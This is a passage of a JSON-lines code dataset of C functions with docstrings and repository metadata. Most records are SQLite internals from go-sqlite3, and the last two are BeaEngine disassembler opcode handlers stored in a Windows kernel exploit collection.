pTab->aCol[iCol].affinity==SQLITE_AFF_REAL ){\n        sqlite3VdbeAddOp1(v, OP_RealAffinity, target);\n      }\n#endif\n      break;\n    }\n\n    case TK_VECTOR: {\n      sqlite3ErrorMsg(pParse, \"row value misused\");\n      break;\n    }\n\n    /* TK_IF_NULL_ROW Expr nodes are inserted ahead of expressions\n    ** that derive from the right-hand table of a LEFT JOIN.  The\n    ** Expr.iTable value is the table number for the right-hand table.\n    ** The expression is only evaluated if that table is not currently\n    ** on a LEFT JOIN NULL row.\n    */\n    case TK_IF_NULL_ROW: {\n      int addrINR;\n      u8 okConstFactor = pParse->okConstFactor;\n      addrINR = sqlite3VdbeAddOp1(v, OP_IfNullRow, pExpr->iTable);\n      /* Temporarily disable factoring of constant expressions, since\n      ** even though expressions may appear to be constant, they are not\n      ** really constant because they originate from the right-hand side\n      ** of a LEFT JOIN. */\n      pParse->okConstFactor = 0;\n      inReg = sqlite3ExprCodeTarget(pParse, pExpr->pLeft, target);\n      pParse->okConstFactor = okConstFactor;\n      sqlite3VdbeJumpHere(v, addrINR);\n      sqlite3VdbeChangeP3(v, addrINR, inReg);\n      break;\n    }\n\n    /*\n    ** Form A:\n    **   CASE x WHEN e1 THEN r1 WHEN e2 THEN r2 ... WHEN eN THEN rN ELSE y END\n    **\n    ** Form B:\n    **   CASE WHEN e1 THEN r1 WHEN e2 THEN r2 ... WHEN eN THEN rN ELSE y END\n    **\n    ** Form A is can be transformed into the equivalent form B as follows:\n    **   CASE WHEN x=e1 THEN r1 WHEN x=e2 THEN r2 ...\n    **        WHEN x=eN THEN rN ELSE y END\n    **\n    ** X (if it exists) is in pExpr->pLeft.\n    ** Y is in the last element of pExpr->x.pList if pExpr->x.pList->nExpr is\n    ** odd.  The Y is also optional.  If the number of elements in x.pList\n    ** is even, then Y is omitted and the \"otherwise\" result is NULL.\n    ** Ei is in pExpr->pList->a[i*2] and Ri is pExpr->pList->a[i*2+1].\n    **\n    ** The result of the expression is the Ri for the first matching Ei,\n    ** or if there is no matching Ei, the ELSE term Y, or if there is\n    ** no ELSE term, NULL.\n    */\n    case TK_CASE: {\n      int endLabel;                     /* GOTO label for end of CASE stmt */\n      int nextCase;                     /* GOTO label for next WHEN clause */\n      int nExpr;                        /* 2x number of WHEN terms */\n      int i;                            /* Loop counter */\n      ExprList *pEList;                 /* List of WHEN terms */\n      struct ExprList_item *aListelem;  /* Array of WHEN terms */\n      Expr opCompare;                   /* The X==Ei expression */\n      Expr *pX;                         /* The X expression */\n      Expr *pTest = 0;                  /* X==Ei (form A) or just Ei (form B) */\n      Expr *pDel = 0;\n      sqlite3 *db = pParse->db;\n\n      assert( !ExprHasProperty(pExpr, EP_xIsSelect) && pExpr->x.pList );\n      assert(pExpr->x.pList->nExpr > 0);\n      pEList = pExpr->x.pList;\n      aListelem = pEList->a;\n      nExpr = pEList->nExpr;\n      endLabel = sqlite3VdbeMakeLabel(pParse);\n      if( (pX = pExpr->pLeft)!=0 ){\n        pDel = sqlite3ExprDup(db, pX, 0);\n        if( db->mallocFailed ){\n          sqlite3ExprDelete(db, pDel);\n          break;\n        }\n        testcase( pX->op==TK_COLUMN );\n        exprToRegister(pDel, exprCodeVector(pParse, pDel, &regFree1));\n        testcase( regFree1==0 );\n        memset(&opCompare, 0, sizeof(opCompare));\n        opCompare.op = TK_EQ;\n        opCompare.pLeft = pDel;\n        pTest = &opCompare;\n        /* Ticket b351d95f9cd5ef17e9d9dbae18f5ca8611190001:\n        ** The value in regFree1 might get SCopy-ed into the file result.\n        ** So make sure that the regFree1 register is not reused for other\n        ** purposes and possibly overwritten.  */\n        regFree1 = 0;\n      }\n      for(i=0; i<nExpr-1; i=i+2){\n        if( pX ){\n          assert( pTest!=0 );\n          opCompare.pRight = aListelem[i].pExpr;\n        }else{\n          pTest = aListelem[i].pExpr;\n        }\n        nextCase = sqlite3VdbeMakeLabel(pParse);\n        testcase( pTest->op==TK_COLUMN );\n        sqlite3ExprIfFalse(pParse, pTest, nextCase, SQLITE_JUMPIFNULL);\n        testcase( aListelem[i+1].pExpr->op==TK_COLUMN );\n        sqlite3ExprCode(pParse, aListelem[i+1].pExpr, target);\n        sqlite3VdbeGoto(v, endLabel);\n        sqlite3VdbeResolveLabel(v, nextCase);\n      }\n      if( (nExpr&1)!=0 ){\n        sqlite3ExprCode(pParse, pEList->a[nExpr-1].pExpr, target);\n      }else{\n        sqlite3VdbeAddOp2(v, OP_Null, 0, target);\n      }\n      sqlite3ExprDelete(db, pDel);\n      setDoNotMergeFlagOnCopy(v);\n      sqlite3VdbeResolveLabel(v, endLabel);\n      break;\n    }\n#ifndef SQLITE_OMIT_TRIGGER\n    case TK_RAISE: {\n      assert( pExpr->affExpr==OE_Rollback\n           || pExpr->affExpr==OE_Abort\n           || pExpr->affExpr==OE_Fail\n           || pExpr->affExpr==OE_Ignore\n      );\n      if( !pParse->pTriggerTab && !pParse->nested ){\n        sqlite3ErrorMsg(pParse,\n                       \"RAISE() may only be used within a trigger-program\");\n        return 0;\n      }\n      if( pExpr->affExpr==OE_Abort ){\n        sqlite3MayAbort(pParse);\n      }\n      assert( !ExprHasProperty(pExpr, EP_IntValue) );\n      if( pExpr->affExpr==OE_Ignore ){\n        sqlite3VdbeAddOp4(\n            v, OP_Halt, SQLITE_OK, OE_Ignore, 0, pExpr->u.zToken,0);\n        VdbeCoverage(v);\n      }else{\n        sqlite3HaltConstraint(pParse,\n             pParse->pTriggerTab ? SQLITE_CONSTRAINT_TRIGGER : SQLITE_ERROR,\n             pExpr->affExpr, pExpr->u.zToken, 0, 0);\n      }\n\n      break;\n    }\n#endif\n  }\n  sqlite3ReleaseTempReg(pParse, regFree1);\n  sqlite3ReleaseTempReg(pParse, regFree2);\n  return inReg;\n}", "path": "go-sqlite3/sqlite3-binding.c", "commit_date": "2020-12-26 00:00:00", "repo_name": "mattn/go-sqlite3", "stars": 7311, "license": "mit", "language": "c", "size": 53481}
{"docstring": "/*\n** The parser calls this routine after the CREATE VIRTUAL TABLE statement\n** has been completely parsed.\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3VtabFinishParse(Parse *pParse, Token *pEnd)", "code": "{\n  Table *pTab = pParse->pNewTable;  /* The table being constructed */\n  sqlite3 *db = pParse->db;         /* The database connection */\n\n  if( pTab==0 ) return;\n  addArgumentToVtab(pParse);\n  pParse->sArg.z = 0;\n  if( pTab->nModuleArg<1 ) return;\n\n  /* If the CREATE VIRTUAL TABLE statement is being entered for the\n  ** first time (in other words if the virtual table is actually being\n  ** created now instead of just being read out of sqlite_schema) then\n  ** do additional initialization work and store the statement text\n  ** in the sqlite_schema table.\n  */\n  if( !db->init.busy ){\n    char *zStmt;\n    char *zWhere;\n    int iDb;\n    int iReg;\n    Vdbe *v;\n\n    sqlite3MayAbort(pParse);\n\n    /* Compute the complete text of the CREATE VIRTUAL TABLE statement */\n    if( pEnd ){\n      pParse->sNameToken.n = (int)(pEnd->z - pParse->sNameToken.z) + pEnd->n;\n    }\n    zStmt = sqlite3MPrintf(db, \"CREATE VIRTUAL TABLE %T\", &pParse->sNameToken);\n\n    /* A slot for the record has already been allocated in the\n    ** schema table.  We just need to update that slot with all\n    ** the information we've collected.\n    **\n    ** The VM register number pParse->regRowid holds the rowid of an\n    ** entry in the sqlite_schema table tht was created for this vtab\n    ** by sqlite3StartTable().\n    */\n    iDb = sqlite3SchemaToIndex(db, pTab->pSchema);\n    sqlite3NestedParse(pParse,\n      \"UPDATE %Q.\" DFLT_SCHEMA_TABLE \" \"\n         \"SET type='table', name=%Q, tbl_name=%Q, rootpage=0, sql=%Q \"\n       \"WHERE rowid=#%d\",\n      db->aDb[iDb].zDbSName,\n      pTab->zName,\n      pTab->zName,\n      zStmt,\n      pParse->regRowid\n    );\n    v = sqlite3GetVdbe(pParse);\n    sqlite3ChangeCookie(pParse, iDb);\n\n    sqlite3VdbeAddOp0(v, OP_Expire);\n    zWhere = sqlite3MPrintf(db, \"name=%Q AND sql=%Q\", pTab->zName, zStmt);\n    sqlite3VdbeAddParseSchemaOp(v, iDb, zWhere);\n    sqlite3DbFree(db, zStmt);\n\n    iReg = ++pParse->nMem;\n    sqlite3VdbeLoadString(v, iReg, pTab->zName);\n    sqlite3VdbeAddOp2(v, OP_VCreate, iDb, iReg);\n  }\n\n  /* If we are rereading the sqlite_schema table create the in-memory\n  ** record of the table. The xConnect() method is not called until\n  ** the first time the virtual table is used in an SQL statement. This\n  ** allows a schema that contains virtual tables to be loaded before\n  ** the required virtual table implementations are registered.  */\n  else {\n    Table *pOld;\n    Schema *pSchema = pTab->pSchema;\n    const char *zName = pTab->zName;\n    assert( sqlite3SchemaMutexHeld(db, 0, pSchema) );\n    pOld = sqlite3HashInsert(&pSchema->tblHash, zName, pTab);\n    if( pOld ){\n      sqlite3OomFault(db);\n      assert( pTab==pOld );  /* Malloc must have failed inside HashInsert() */\n      return;\n    }\n    pParse->pNewTable = 0;\n  }\n}", "path": "go-sqlite3/sqlite3-binding.c", "commit_date": "2020-12-26 00:00:00", "repo_name": "mattn/go-sqlite3", "stars": 7311, "license": "mit", "language": "c", "size": 53481}
{"docstring": "/*\n** Set *pnMax to the largest segment level in the database for the index\n** iIndex.\n**\n** Segment levels are stored in the 'level' column of the %_segdir table.\n**\n** Return SQLITE_OK if successful, or an SQLite error code if not.\n*/\n", "func_signal": "static int fts3SegmentMaxLevel(\n  Fts3Table *p,\n  int iLangid,\n  int iIndex,\n  sqlite3_int64 *pnMax\n)", "code": "{\n  sqlite3_stmt *pStmt;\n  int rc;\n  assert( iIndex>=0 && iIndex<p->nIndex );\n\n  /* Set pStmt to the compiled version of:\n  **\n  **   SELECT max(level) FROM %Q.'%q_segdir' WHERE level BETWEEN ? AND ?\n  **\n  ** (1024 is actually the value of macro FTS3_SEGDIR_PREFIXLEVEL_STR).\n  */\n  rc = fts3SqlStmt(p, SQL_SELECT_SEGDIR_MAX_LEVEL, &pStmt, 0);\n  if( rc!=SQLITE_OK ) return rc;\n  sqlite3_bind_int64(pStmt, 1, getAbsoluteLevel(p, iLangid, iIndex, 0));\n  sqlite3_bind_int64(pStmt, 2,\n      getAbsoluteLevel(p, iLangid, iIndex, FTS3_SEGDIR_MAXLEVEL-1)\n  );\n  if( SQLITE_ROW==sqlite3_step(pStmt) ){\n    *pnMax = sqlite3_column_int64(pStmt, 0);\n  }\n  return sqlite3_reset(pStmt);\n}", "path": "go-sqlite3/sqlite3-binding.c", "commit_date": "2020-12-26 00:00:00", "repo_name": "mattn/go-sqlite3", "stars": 7311, "license": "mit", "language": "c", "size": 53481}
{"docstring": "/*\n** Exit the recursive mutex on a Btree.\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3BtreeLeave(Btree *p)", "code": "{\n  assert( sqlite3_mutex_held(p->db->mutex) );\n  if( p->sharable ){\n    assert( p->wantToLock>0 );\n    p->wantToLock--;\n    if( p->wantToLock==0 ){\n      unlockBtreeMutex(p);\n    }\n  }\n}", "path": "go-sqlite3/sqlite3-binding.c", "commit_date": "2020-12-26 00:00:00", "repo_name": "mattn/go-sqlite3", "stars": 7311, "license": "mit", "language": "c", "size": 53481}
{"docstring": "/*\n** The second argument is a Trigger structure allocated by the\n** fkActionTrigger() routine. This function deletes the Trigger structure\n** and all of its sub-components.\n**\n** The Trigger structure or any of its sub-components may be allocated from\n** the lookaside buffer belonging to database handle dbMem.\n*/\n", "func_signal": "static void fkTriggerDelete(sqlite3 *dbMem, Trigger *p)", "code": "{\n  if( p ){\n    TriggerStep *pStep = p->step_list;\n    sqlite3ExprDelete(dbMem, pStep->pWhere);\n    sqlite3ExprListDelete(dbMem, pStep->pExprList);\n    sqlite3SelectDelete(dbMem, pStep->pSelect);\n    sqlite3ExprDelete(dbMem, p->pWhen);\n    sqlite3DbFree(dbMem, p);\n  }\n}", "path": "go-sqlite3/sqlite3-binding.c", "commit_date": "2020-12-26 00:00:00", "repo_name": "mattn/go-sqlite3", "stars": 7311, "license": "mit", "language": "c", "size": 53481}
{"docstring": "/*\n** This function is called when the PmaReader corresponding to pIncr has\n** finished reading the contents of aFile[0]. Its purpose is to \"refill\"\n** aFile[0] such that the PmaReader should start rereading it from the\n** beginning.\n**\n** For single-threaded objects, this is accomplished by literally reading\n** keys from pIncr->pMerger and repopulating aFile[0].\n**\n** For multi-threaded objects, all that is required is to wait until the\n** background thread is finished (if it is not already) and then swap\n** aFile[0] and aFile[1] in place. If the contents of pMerger have not\n** been exhausted, this function also launches a new background thread\n** to populate the new aFile[1].\n**\n** SQLITE_OK is returned on success, or an SQLite error code otherwise.\n*/\n", "func_signal": "static int vdbeIncrSwap(IncrMerger *pIncr)", "code": "{\n  int rc = SQLITE_OK;\n\n#if SQLITE_MAX_WORKER_THREADS>0\n  if( pIncr->bUseThread ){\n    rc = vdbeSorterJoinThread(pIncr->pTask);\n\n    if( rc==SQLITE_OK ){\n      SorterFile f0 = pIncr->aFile[0];\n      pIncr->aFile[0] = pIncr->aFile[1];\n      pIncr->aFile[1] = f0;\n    }\n\n    if( rc==SQLITE_OK ){\n      if( pIncr->aFile[0].iEof==pIncr->iStartOff ){\n        pIncr->bEof = 1;\n      }else{\n        rc = vdbeIncrBgPopulate(pIncr);\n      }\n    }\n  }else\n#endif\n  {\n    rc = vdbeIncrPopulate(pIncr);\n    pIncr->aFile[0] = pIncr->aFile[1];\n    if( pIncr->aFile[0].iEof==pIncr->iStartOff ){\n      pIncr->bEof = 1;\n    }\n  }\n\n  return rc;\n}", "path": "go-sqlite3/sqlite3-binding.c", "commit_date": "2020-12-26 00:00:00", "repo_name": "mattn/go-sqlite3", "stars": 7311, "license": "mit", "language": "c", "size": 53481}
{"docstring": "/*\n** Convert an ANSI string to Microsoft Unicode, using the ANSI or OEM\n** code page.\n**\n** Space to hold the returned string is obtained from sqlite3_malloc().\n*/\n", "func_signal": "static LPWSTR winMbcsToUnicode(const char *zText, int useAnsi)", "code": "{\n  int nByte;\n  LPWSTR zMbcsText;\n  int codepage = useAnsi ? CP_ACP : CP_OEMCP;\n\n  nByte = osMultiByteToWideChar(codepage, 0, zText, -1, NULL,\n                                0)*sizeof(WCHAR);\n  if( nByte==0 ){\n    return 0;\n  }\n  zMbcsText = sqlite3MallocZero( nByte*sizeof(WCHAR) );\n  if( zMbcsText==0 ){\n    return 0;\n  }\n  nByte = osMultiByteToWideChar(codepage, 0, zText, -1, zMbcsText,\n                                nByte);\n  if( nByte==0 ){\n    sqlite3_free(zMbcsText);\n    zMbcsText = 0;\n  }\n  return zMbcsText;\n}", "path": "go-sqlite3/sqlite3-binding.c", "commit_date": "2020-12-26 00:00:00", "repo_name": "mattn/go-sqlite3", "stars": 7311, "license": "mit", "language": "c", "size": 53481}
{"docstring": "/*\n** Return the value of a status counter for a prepared statement\n*/\n", "func_signal": "SQLITE_API int sqlite3_stmt_status(sqlite3_stmt *pStmt, int op, int resetFlag)", "code": "{\n  Vdbe *pVdbe = (Vdbe*)pStmt;\n  u32 v;\n#ifdef SQLITE_ENABLE_API_ARMOR\n  if( !pStmt\n   || (op!=SQLITE_STMTSTATUS_MEMUSED && (op<0||op>=ArraySize(pVdbe->aCounter)))\n  ){\n    (void)SQLITE_MISUSE_BKPT;\n    return 0;\n  }\n#endif\n  if( op==SQLITE_STMTSTATUS_MEMUSED ){\n    sqlite3 *db = pVdbe->db;\n    sqlite3_mutex_enter(db->mutex);\n    v = 0;\n    db->pnBytesFreed = (int*)&v;\n    sqlite3VdbeClearObject(db, pVdbe);\n    sqlite3DbFree(db, pVdbe);\n    db->pnBytesFreed = 0;\n    sqlite3_mutex_leave(db->mutex);\n  }else{\n    v = pVdbe->aCounter[op];\n    if( resetFlag ) pVdbe->aCounter[op] = 0;\n  }\n  return (int)v;\n}", "path": "go-sqlite3/sqlite3-binding.c", "commit_date": "2020-12-26 00:00:00", "repo_name": "mattn/go-sqlite3", "stars": 7311, "license": "mit", "language": "c", "size": 53481}
{"docstring": "/*\n** Move an existing blob handle to point to a different row of the same\n** database table.\n**\n** If an error occurs, or if the specified row does not exist or does not\n** contain a blob or text value, then an error code is returned and the\n** database handle error code and message set. If this happens, then all\n** subsequent calls to sqlite3_blob_xxx() functions (except blob_close())\n** immediately return SQLITE_ABORT.\n*/\n", "func_signal": "SQLITE_API int sqlite3_blob_reopen(sqlite3_blob *pBlob, sqlite3_int64 iRow)", "code": "{\n  int rc;\n  Incrblob *p = (Incrblob *)pBlob;\n  sqlite3 *db;\n\n  if( p==0 ) return SQLITE_MISUSE_BKPT;\n  db = p->db;\n  sqlite3_mutex_enter(db->mutex);\n\n  if( p->pStmt==0 ){\n    /* If there is no statement handle, then the blob-handle has\n    ** already been invalidated. Return SQLITE_ABORT in this case.\n    */\n    rc = SQLITE_ABORT;\n  }else{\n    char *zErr;\n    rc = blobSeekToRow(p, iRow, &zErr);\n    if( rc!=SQLITE_OK ){\n      sqlite3ErrorWithMsg(db, rc, (zErr ? \"%s\" : 0), zErr);\n      sqlite3DbFree(db, zErr);\n    }\n    assert( rc!=SQLITE_SCHEMA );\n  }\n\n  rc = sqlite3ApiExit(db, rc);\n  assert( rc==SQLITE_OK || p->pStmt==0 );\n  sqlite3_mutex_leave(db->mutex);\n  return rc;\n}", "path": "go-sqlite3/sqlite3-binding.c", "commit_date": "2020-12-26 00:00:00", "repo_name": "mattn/go-sqlite3", "stars": 7311, "license": "mit", "language": "c", "size": 53481}
{"docstring": "/*\n** Do a comparison between a 64-bit signed integer and a 64-bit floating-point\n** number.  Return negative, zero, or positive if the first (i64) is less than,\n** equal to, or greater than the second (double).\n*/\n", "func_signal": "static int sqlite3IntFloatCompare(i64 i, double r)", "code": "{\n  if( sizeof(LONGDOUBLE_TYPE)>8 ){\n    LONGDOUBLE_TYPE x = (LONGDOUBLE_TYPE)i;\n    testcase( x<r );\n    testcase( x>r );\n    testcase( x==r );\n    if( x<r ) return -1;\n    if( x>r ) return +1;  /*NO_TEST*/ /* work around bugs in gcov */\n    return 0;             /*NO_TEST*/ /* work around bugs in gcov */\n  }else{\n    i64 y;\n    double s;\n    if( r<-9223372036854775808.0 ) return +1;\n    if( r>=9223372036854775808.0 ) return -1;\n    y = (i64)r;\n    if( i<y ) return -1;\n    if( i>y ) return +1;\n    s = (double)i;\n    if( s<r ) return -1;\n    if( s>r ) return +1;\n    return 0;\n  }\n}", "path": "go-sqlite3/sqlite3-binding.c", "commit_date": "2020-12-26 00:00:00", "repo_name": "mattn/go-sqlite3", "stars": 7311, "license": "mit", "language": "c", "size": 53481}
{"docstring": "/*\n** Read and return an unsigned 32-bit big-endian integer from the buffer\n** passed as the only argument.\n*/\n", "func_signal": "static u32 rbuGetU32(u8 *aBuf)", "code": "{\n  return ((u32)aBuf[0] << 24)\n       + ((u32)aBuf[1] << 16)\n       + ((u32)aBuf[2] <<  8)\n       + ((u32)aBuf[3]);\n}", "path": "go-sqlite3/sqlite3-binding.c", "commit_date": "2020-12-26 00:00:00", "repo_name": "mattn/go-sqlite3", "stars": 7311, "license": "mit", "language": "c", "size": 53481}
{"docstring": "/*\n** Close a file.\n*/\n", "func_signal": "static int flockClose(sqlite3_file *id)", "code": "{\n  assert( id!=0 );\n  flockUnlock(id, NO_LOCK);\n  return closeUnixFile(id);\n}", "path": "go-sqlite3/sqlite3-binding.c", "commit_date": "2020-12-26 00:00:00", "repo_name": "mattn/go-sqlite3", "stars": 7311, "license": "mit", "language": "c", "size": 53481}
{"docstring": "/*\n** Append the hash of the blob passed via the second and third arguments to\n** the hash-key value passed as the first. Return the new hash-key value.\n*/\n", "func_signal": "static unsigned int sessionHashAppendBlob(unsigned int h, int n, const u8 *z)", "code": "{\n  int i;\n  for(i=0; i<n; i++) h = HASH_APPEND(h, z[i]);\n  return h;\n}", "path": "go-sqlite3/sqlite3-binding.c", "commit_date": "2020-12-26 00:00:00", "repo_name": "mattn/go-sqlite3", "stars": 7311, "license": "mit", "language": "c", "size": 53481}
{"docstring": "/* Return the value to pass to a sqlite3_wal_hook callback, the\n** number of frames in the WAL at the point of the last commit since\n** sqlite3WalCallback() was called.  If no commits have occurred since\n** the last call, then return 0.\n*/\n", "func_signal": "SQLITE_PRIVATE int sqlite3WalCallback(Wal *pWal)", "code": "{\n  u32 ret = 0;\n  if( pWal ){\n    ret = pWal->iCallback;\n    pWal->iCallback = 0;\n  }\n  return (int)ret;\n}", "path": "go-sqlite3/sqlite3-binding.c", "commit_date": "2020-12-26 00:00:00", "repo_name": "mattn/go-sqlite3", "stars": 7311, "license": "mit", "language": "c", "size": 53481}
{"docstring": "/*\n** Reset the aggregate accumulator.\n**\n** The aggregate accumulator is a set of memory cells that hold\n** intermediate results while calculating an aggregate.  This\n** routine generates code that stores NULLs in all of those memory\n** cells.\n*/\n", "func_signal": "static void resetAccumulator(Parse *pParse, AggInfo *pAggInfo)", "code": "{\n  Vdbe *v = pParse->pVdbe;\n  int i;\n  struct AggInfo_func *pFunc;\n  int nReg = pAggInfo->nFunc + pAggInfo->nColumn;\n  if( nReg==0 ) return;\n  if( pParse->nErr || pParse->db->mallocFailed ) return;\n#ifdef SQLITE_DEBUG\n  /* Verify that all AggInfo registers are within the range specified by\n  ** AggInfo.mnReg..AggInfo.mxReg */\n  assert( nReg==pAggInfo->mxReg-pAggInfo->mnReg+1 );\n  for(i=0; i<pAggInfo->nColumn; i++){\n    assert( pAggInfo->aCol[i].iMem>=pAggInfo->mnReg\n         && pAggInfo->aCol[i].iMem<=pAggInfo->mxReg );\n  }\n  for(i=0; i<pAggInfo->nFunc; i++){\n    assert( pAggInfo->aFunc[i].iMem>=pAggInfo->mnReg\n         && pAggInfo->aFunc[i].iMem<=pAggInfo->mxReg );\n  }\n#endif\n  sqlite3VdbeAddOp3(v, OP_Null, 0, pAggInfo->mnReg, pAggInfo->mxReg);\n  for(pFunc=pAggInfo->aFunc, i=0; i<pAggInfo->nFunc; i++, pFunc++){\n    if( pFunc->iDistinct>=0 ){\n      Expr *pE = pFunc->pFExpr;\n      assert( !ExprHasProperty(pE, EP_xIsSelect) );\n      if( pE->x.pList==0 || pE->x.pList->nExpr!=1 ){\n        sqlite3ErrorMsg(pParse, \"DISTINCT aggregates must have exactly one \"\n           \"argument\");\n        pFunc->iDistinct = -1;\n      }else{\n        KeyInfo *pKeyInfo = sqlite3KeyInfoFromExprList(pParse, pE->x.pList,0,0);\n        sqlite3VdbeAddOp4(v, OP_OpenEphemeral, pFunc->iDistinct, 0, 0,\n                          (char*)pKeyInfo, P4_KEYINFO);\n      }\n    }\n  }\n}", "path": "go-sqlite3/sqlite3-binding.c", "commit_date": "2020-12-26 00:00:00", "repo_name": "mattn/go-sqlite3", "stars": 7311, "license": "mit", "language": "c", "size": 53481}
{"docstring": "/* This is the Walker callback from sqlite3ExprReferencesUpdatedColumn().\n*  Set bit 0x01 of pWalker->eCode if pWalker->eCode to 0 and if this\n** expression node references any of the\n** columns that are being modifed by an UPDATE statement.\n*/\n", "func_signal": "static int checkConstraintExprNode(Walker *pWalker, Expr *pExpr)", "code": "{\n  if( pExpr->op==TK_COLUMN ){\n    assert( pExpr->iColumn>=0 || pExpr->iColumn==-1 );\n    if( pExpr->iColumn>=0 ){\n      if( pWalker->u.aiCol[pExpr->iColumn]>=0 ){\n        pWalker->eCode |= CKCNSTRNT_COLUMN;\n      }\n    }else{\n      pWalker->eCode |= CKCNSTRNT_ROWID;\n    }\n  }\n  return WRC_Continue;\n}", "path": "go-sqlite3/sqlite3-binding.c", "commit_date": "2020-12-26 00:00:00", "repo_name": "mattn/go-sqlite3", "stars": 7311, "license": "mit", "language": "c", "size": 53481}
{"docstring": "/*\n** Advance a bytecodevtab_cursor to its next row of output.\n*/\n", "func_signal": "static int bytecodevtabNext(sqlite3_vtab_cursor *cur)", "code": "{\n  bytecodevtab_cursor *pCur = (bytecodevtab_cursor*)cur;\n  bytecodevtab *pTab = (bytecodevtab*)cur->pVtab;\n  int rc;\n  if( pCur->zP4 ){\n    sqlite3_free(pCur->zP4);\n    pCur->zP4 = 0;\n  }\n  if( pCur->zName ){\n    pCur->zName = 0;\n    pCur->zType = 0;\n    pCur->zSchema = 0;\n  }\n  rc = sqlite3VdbeNextOpcode(\n           (Vdbe*)pCur->pStmt,\n           pCur->showSubprograms ? &pCur->sub : 0,\n           pTab->bTablesUsed,\n           &pCur->iRowid,\n           &pCur->iAddr,\n           &pCur->aOp);\n  if( rc!=SQLITE_OK ){\n    sqlite3VdbeMemSetNull(&pCur->sub);\n    pCur->aOp = 0;\n  }\n  return SQLITE_OK;\n}", "path": "go-sqlite3/sqlite3-binding.c", "commit_date": "2020-12-26 00:00:00", "repo_name": "mattn/go-sqlite3", "stars": 7311, "license": "mit", "language": "c", "size": 53481}
{"docstring": "/*\n** Generate VDBE code for a BEGIN statement.\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3BeginTransaction(Parse *pParse, int type)", "code": "{\n  sqlite3 *db;\n  Vdbe *v;\n  int i;\n\n  assert( pParse!=0 );\n  db = pParse->db;\n  assert( db!=0 );\n  if( sqlite3AuthCheck(pParse, SQLITE_TRANSACTION, \"BEGIN\", 0, 0) ){\n    return;\n  }\n  v = sqlite3GetVdbe(pParse);\n  if( !v ) return;\n  if( type!=TK_DEFERRED ){\n    for(i=0; i<db->nDb; i++){\n      int eTxnType;\n      Btree *pBt = db->aDb[i].pBt;\n      if( pBt && sqlite3BtreeIsReadonly(pBt) ){\n        eTxnType = 0;  /* Read txn */\n      }else if( type==TK_EXCLUSIVE ){\n        eTxnType = 2;  /* Exclusive txn */\n      }else{\n        eTxnType = 1;  /* Write txn */\n      }\n      sqlite3VdbeAddOp2(v, OP_Transaction, i, eTxnType);\n      sqlite3VdbeUsesBtree(v, i);\n    }\n  }\n  sqlite3VdbeAddOp0(v, OP_AutoCommit);\n}", "path": "go-sqlite3/sqlite3-binding.c", "commit_date": "2020-12-26 00:00:00", "repo_name": "mattn/go-sqlite3", "stars": 7311, "license": "mit", "language": "c", "size": 53481}
{"docstring": "/*\n** Return SQLITE_CORRUPT if any cursor other than pCur is currently valid\n** on the same B-tree as pCur.\n**\n** This can if a database is corrupt with two or more SQL tables\n** pointing to the same b-tree.  If an insert occurs on one SQL table\n** and causes a BEFORE TRIGGER to do a secondary insert on the other SQL\n** table linked to the same b-tree.  If the secondary insert causes a\n** rebalance, that can change content out from under the cursor on the\n** first SQL table, violating invariants on the first insert.\n*/\n", "func_signal": "static int anotherValidCursor(BtCursor *pCur)", "code": "{\n  BtCursor *pOther;\n  for(pOther=pCur->pBt->pCursor; pOther; pOther=pOther->pNext){\n    if( pOther!=pCur\n     && pOther->eState==CURSOR_VALID\n     && pOther->pPage==pCur->pPage\n    ){\n      return SQLITE_CORRUPT_BKPT;\n    }\n  }\n  return SQLITE_OK;\n}", "path": "go-sqlite3/sqlite3-binding.c", "commit_date": "2020-12-26 00:00:00", "repo_name": "mattn/go-sqlite3", "stars": 7311, "license": "mit", "language": "c", "size": 53481}
{"docstring": "/*\n** Unless it is NULL, the argument must be an UnpackedRecord object returned\n** by an earlier call to sqlite3Stat4ProbeSetValue(). This call deletes\n** the object.\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3Stat4ProbeFree(UnpackedRecord *pRec)", "code": "{\n  if( pRec ){\n    int i;\n    int nCol = pRec->pKeyInfo->nAllField;\n    Mem *aMem = pRec->aMem;\n    sqlite3 *db = aMem[0].db;\n    for(i=0; i<nCol; i++){\n      sqlite3VdbeMemRelease(&aMem[i]);\n    }\n    sqlite3KeyInfoUnref(pRec->pKeyInfo);\n    sqlite3DbFreeNN(db, pRec);\n  }\n}", "path": "go-sqlite3/sqlite3-binding.c", "commit_date": "2020-12-26 00:00:00", "repo_name": "mattn/go-sqlite3", "stars": 7311, "license": "mit", "language": "c", "size": 53481}
{"docstring": "/* =======================================\n *      0fc0h\n * ======================================= */\n", "func_signal": "void __bea_callspec__ xadd_EbGb(PDISASM pMyDisasm)", "code": "{\n    if ((*pMyDisasm).Prefix.LockPrefix == InvalidPrefix) {\n        (*pMyDisasm).Prefix.LockPrefix = InUsePrefix;\n    }\n    (*pMyDisasm).Instruction.Category = GENERAL_PURPOSE_INSTRUCTION+DATA_TRANSFER;\n    #ifndef BEA_LIGHT_DISASSEMBLY\n       (void) strcpy ((*pMyDisasm).Instruction.Mnemonic, \"xadd \");\n    #endif\n    EbGb(pMyDisasm);\n    FillFlags(pMyDisasm,110);\n}", "path": "windows-kernel-exploits/MS12-042/sysret-source/junk/sources/beaengineSources/Includes/instr_set/opcodes_N_Z.c", "commit_date": "2017-07-19 00:00:00", "repo_name": "SecWiki/windows-kernel-exploits", "stars": 7711, "license": "mit", "language": "c", "size": 244415}
{"docstring": "/* =======================================\n *      0f90h\n * ======================================= */\n", "func_signal": "void __bea_callspec__ setb_(PDISASM pMyDisasm)", "code": "{\n    (*pMyDisasm).Instruction.Category = GENERAL_PURPOSE_INSTRUCTION+BIT_UInt8;\n    #ifndef BEA_LIGHT_DISASSEMBLY\n       (void) strcpy ((*pMyDisasm).Instruction.Mnemonic, \"setb \");\n    #endif\n    GV.MemDecoration = Arg2byte;\n    GV.OperandSize = 8;\n    MOD_RM(&(*pMyDisasm).Argument2, pMyDisasm);\n    GV.OperandSize = 32;\n    GV.EIP_+= GV.DECALAGE_EIP+2;\n    FillFlags(pMyDisasm,95);\n}", "path": "windows-kernel-exploits/MS12-042/sysret-source/junk/sources/beaengineSources/Includes/instr_set/opcodes_N_Z.c", "commit_date": "2017-07-19 00:00:00", "repo_name": "SecWiki/windows-kernel-exploits", "stars": 7711, "license": "mit", "language": "c", "size": 244415}
